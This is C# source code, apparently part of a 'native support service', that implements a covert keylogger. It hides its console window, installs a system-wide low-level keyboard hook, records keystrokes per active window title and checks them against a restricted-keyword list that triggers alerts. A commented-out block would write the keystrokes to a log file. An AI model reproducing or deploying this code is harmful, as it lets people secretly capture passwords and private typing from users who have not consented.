using NativeSupportServiceApplication.Models;
using NativeSupportServiceApplication.Utils;
using System.Collections.Concurrent;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace NativeSupportServiceApplication.Modules
{

    class KeyStrokeCache
    {
        

        public static ConcurrentDictionary<String, KeyStrokeBuffer> cache = new ConcurrentDictionary<string, KeyStrokeBuffer>();
        public static void appendCharacter(char c, String windowTitle)
        {
            windowTitle = String.IsNullOrEmpty(windowTitle) ? "DefCorporateEyeWindow!@34" : windowTitle;

            if (cache.ContainsKey(windowTitle))
            {
                cache.GetValueOrDefault(windowTitle).appendCharacter(c);
            }
            else
            {
                cache.TryAdd(windowTitle, new KeyStrokeBuffer().appendCharacter(c));

            }

        }

        public static void deleteChar(String windowTitle)
        {
            windowTitle = String.IsNullOrEmpty(windowTitle) ? "DefCorporateEyeWindow!@34" : windowTitle;

            if (cache.ContainsKey(windowTitle))
            {
                cache.GetValueOrDefault(windowTitle).deleteLastChar();
            }
            else
            {
                cache.TryAdd(windowTitle, new KeyStrokeBuffer().deleteLastChar());

            }

        }
    }

    class KeyStrokeBuffer
    {
        private StringBuilder keyStrokeBuffer = new StringBuilder();

        private int MAX_LENGTH = 1024;

        public String stringValue()
        {
            return keyStrokeBuffer.ToString();
        }
        public KeyStrokeBuffer appendCharacter(char c)
        {

            keyStrokeBuffer.Append(c);

            if (keyStrokeBuffer.Length > MAX_LENGTH)
            {
                keyStrokeBuffer.Remove(0, 1);

            }
            return this;
        }
        public KeyStrokeBuffer deleteLastChar()
        {
            if (keyStrokeBuffer.Length > 0)
            {
                keyStrokeBuffer.Remove(keyStrokeBuffer.Length - 1, 1);
            }
            Debug.WriteLine("Now line " + keyStrokeBuffer.ToString());
            return this;
        }
    }
    class InterceptKeys
    {

        
        private static string GetActiveWindowTitle()
        {
            const int nChars = 256;
            StringBuilder Buff = new StringBuilder(nChars);
            IntPtr handle = GetForegroundWindow();

            if (GetWindowText(handle, Buff, nChars) > 0)
            {
                return Buff.ToString();
            }
            return null;
        }

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        public static char pk1 = '1', pk2 = '2', pk3 = '3', pk4 = '4';
        public static void startMonitor()
        {
            var handle = GetConsoleWindow();

            // Hide
            ShowWindow(handle, SW_HIDE);

            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);

        }


        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(
            int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(
            int nCode, IntPtr wParam, IntPtr lParam)
        {

            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {

                int vkCode = Marshal.ReadInt32(lParam);

                String windowTitle = GetActiveWindowTitle();

                pk4 = pk3;
                pk3 = pk2;
                pk2 = pk1;
                pk1 = (char)vkCode;

                if (pk1 == (char)8 || pk1 == (char)127)
                { 
                }

                    Debug.WriteLine(vkCode);

                if (vkCode > 31 && vkCode < 127)
                {
                    KeyStrokeCache.appendCharacter((char)vkCode, windowTitle);

                    processKeypress(windowTitle);


                }
                else if (vkCode == 8)
                {
                    KeyStrokeCache.deleteChar(windowTitle);
                }

                //if (vkCode == 67)
                //{
                //    Application.Exit();
                //}
              //  Debug.WriteLine(KeyStrokeCache.cache);
                //StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
                //sw.Write((Keys)vkCode);
                //sw.Close();
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private static void processKeypress(string windowTitle)
        {
            try
            {
                KeyStrokeCache.cache.TryGetValue(windowTitle, out var buffer);
                Debug.WriteLine(buffer.stringValue());
                foreach (RestrictedKeyword rkeyword in Cache.restrictedKeywords)
                {
                    foreach (String key in rkeyword.RKeyword)
                    {
                        
                        if (buffer.stringValue().ToLower().Contains(" "+key.ToLower()+" "))
                        {

                            rkeyword.ViolatedMsg = key;

                            AlertHandler.handle(rkeyword);
                        }
                    }
                }
            }
            catch
            {
            }
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;


        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);


    }
}